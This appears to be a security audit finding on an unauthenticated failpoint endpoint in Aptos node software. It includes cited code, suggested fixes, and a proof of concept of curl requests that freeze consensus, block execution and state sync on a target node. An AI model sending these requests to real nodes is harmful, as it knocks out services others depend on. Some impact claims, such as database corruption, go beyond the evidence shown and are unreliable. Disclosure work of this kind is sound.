# Audit Report

## Title
Unauthenticated Failpoint Injection Enables Remote Denial of Service on Testnet/Devnet Nodes

## Summary
The `/v1/set_failpoint` API endpoint lacks authentication, allowing unauthenticated remote attackers to trigger critical failpoints on nodes with `failpoints_enabled: true`. This can cause complete denial of service, consensus disruption, and transaction processing failures on publicly accessible testnet/devnet nodes.

## Finding Description

The `attach_poem_to_runtime()` function unconditionally registers the `/v1/set_failpoint` endpoint without any authentication mechanism: [1](#0-0) 

The endpoint handler only performs a configuration check, not authentication: [2](#0-1) 

The configuration sanitizer prevents failpoints on mainnet but explicitly allows them on testnet and devnet: [3](#0-2) 

**Attack Vector:**

1. Attacker identifies a publicly accessible testnet/devnet node with API exposed (common for community-run full nodes providing public services)
2. Attacker sends unauthenticated GET request: `http://[target]:8080/v1/set_failpoint?name=consensus::send::any&actions=100%return`
3. The handler accepts the request if `failpoints_enabled: true` in config
4. Critical failpoints trigger, causing:
   - **Consensus failure**: [4](#0-3) 
   - **Block execution disruption**: [5](#0-4) 
   - **State sync breakage**: [6](#0-5) 

The client implementation shows this is a simple unauthenticated GET request: [7](#0-6) 

## Impact Explanation

**Severity: High to Critical** (depending on deployment context)

This vulnerability enables **Total loss of liveness/network availability** as defined in the Critical severity category. An attacker can remotely trigger failpoints that:

- Completely disable consensus message processing (tested in smoke tests: [8](#0-7) )
- Block all proposal processing, preventing new blocks
- Disrupt transaction execution and state synchronization
- Cause database corruption through execution failures

While mainnet is protected by configuration sanitization, testnet and devnet nodes legitimately enable failpoints for testing and debugging. Community-run public full nodes on these networks become attack targets if they expose the API publicly (common practice to provide RPC services to developers).

## Likelihood Explanation

**Likelihood: Medium**

Exploitation requires:
1. Finding a node with `failpoints_enabled: true` (legitimate for testnet/devnet testing)
2. Public API accessibility (common for community full nodes providing services)
3. No authentication required - simple HTTP GET request

While official Aptos-operated testnet nodes likely don't enable failpoints in production, many community members run public full nodes with debug features enabled. The default API binding is localhost [9](#0-8) , but public nodes must bind to `0.0.0.0` or a public IP to serve users.

## Recommendation

Implement authentication for the failpoint endpoint through one of these approaches:

**Option 1: Authentication Header (Recommended)**
```rust
// In api/src/set_failpoints.rs
use poem::web::headers::Authorization;

#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    auth: Option<Authorization>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        // Verify authentication token
        let token = auth
            .ok_or_else(|| poem::Error::from_status(StatusCode::UNAUTHORIZED))?;
        context.verify_failpoint_token(&token)?;
        
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        // ...
    }
}
```

**Option 2: Conditional Route Registration**
```rust
// In api/src/runtime.rs - only register route if failpoints enabled
let mut v1_route = Route::new()
    .nest("/", api_service)
    .at("/spec.json", poem::get(spec_json))
    .at("/spec.yaml", poem::get(spec_yaml));

if context.failpoints_enabled() {
    v1_route = v1_route.at(
        "/set_failpoint",
        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
    );
}
```

**Option 3: Localhost-Only Binding When Failpoints Enabled**
Add validation in config sanitizer to enforce localhost binding when failpoints are enabled for non-local deployments.

## Proof of Concept

```bash
# Start a testnet node with failpoints enabled and public API
# config.yaml:
# api:
#   address: "0.0.0.0:8080"
#   failpoints_enabled: true

# Attack: Disable consensus message sending
curl "http://target-node:8080/v1/set_failpoint?name=consensus::send::any&actions=100%return"

# Result: Node stops participating in consensus, cannot process new blocks
# Verify by checking node is stuck at same version:
curl "http://target-node:8080/v1" | jq '.ledger_version'
# Wait 30 seconds, check again - same version (node is frozen)

# Attack: Break block execution
curl "http://target-node:8080/v1/set_failpoint?name=executor::block_executor_execute_block&actions=return"

# Result: Node cannot execute blocks, all transactions fail

# Attack: Corrupt state sync
curl "http://target-node:8080/v1/set_failpoint?name=consensus::sync_to_target&actions=return"

# Result: Node cannot synchronize state, permanently desynced
```

## Notes

- The vulnerability only affects nodes with `failpoints_enabled: true`, which are prevented on mainnet by config sanitization [10](#0-9) 
- However, testnet/devnet nodes legitimately enable this feature for debugging
- The endpoint is unconditionally registered in routes regardless of config [11](#0-10) 
- No authentication mechanism exists in the current implementation
- This violates defense-in-depth principles - a testing feature should never be exposed without authentication on public networks

### Citations

**File:** api/src/runtime.rs (L238-252)
```rust
        let route = Route::new()
            .at("/", poem::get(root_handler))
            .nest(
                "/v1",
                Route::new()
                    .nest("/", api_service)
                    .at("/spec.json", poem::get(spec_json))
                    .at("/spec.yaml", poem::get(spec_yaml))
                    // TODO: We add this manually outside of the OpenAPI spec for now.
                    // https://github.com/poem-web/poem/issues/364
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
            )
```

**File:** api/src/set_failpoints.rs (L21-40)
```rust
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**File:** config/src/config/api_config.rs (L95-96)
```rust
const DEFAULT_ADDRESS: &str = "127.0.0.1";
const DEFAULT_PORT: u16 = 8080;
```

**File:** config/src/config/api_config.rs (L177-185)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
        }
```

**File:** consensus/src/round_manager.rs (L727-729)
```rust
        fail_point!("consensus::process_proposal_msg", |_| {
            Err(anyhow::anyhow!("Injected error in process_proposal_msg"))
        });
```

**File:** execution/executor/src/block_executor/mod.rs (L236-240)
```rust
                fail_point!("executor::block_executor_execute_block", |_| {
                    Err(ExecutorError::from(anyhow::anyhow!(
                        "Injected error in block_executor_execute_block"
                    )))
                });
```

**File:** consensus/src/state_computer.rs (L207-209)
```rust
        fail_point!("consensus::sync_to_target", |_| {
            Err(anyhow::anyhow!("Injected error in sync_to_target").into())
        });
```

**File:** crates/aptos-rest-client/src/lib.rs (L1626-1643)
```rust
    pub async fn set_failpoint(&self, name: String, actions: String) -> AptosResult<String> {
        let mut base = self.build_path("set_failpoint")?;
        let url = base
            .query_pairs_mut()
            .append_pair("name", &name)
            .append_pair("actions", &actions)
            .finish();
        let response = self.inner.get(url.clone()).send().await?;

        if !response.status().is_success() {
            Err(parse_error(response).await)
        } else {
            Ok(response
                .text()
                .await
                .map_err(|e| anyhow::anyhow!("To text failed: {:?}", e))?)
        }
    }
```

**File:** testsuite/smoke-test/src/aptos_cli/validator.rs (L120-123)
```rust
    rest_client_off
        .set_failpoint("consensus::send::any".to_string(), "100%return".to_string())
        .await
        .unwrap();
```

**File:** config/src/config/config_sanitizer.rs (L82-91)
```rust
    // Verify that failpoints are not enabled in mainnet
    let failpoints_enabled = are_failpoints_enabled();
    if let Some(chain_id) = chain_id {
        if chain_id.is_mainnet() && failpoints_enabled {
            return Err(Error::ConfigSanitizerFailed(
                sanitizer_name,
                "Failpoints are not supported on mainnet nodes!".into(),
            ));
        }
    }
```
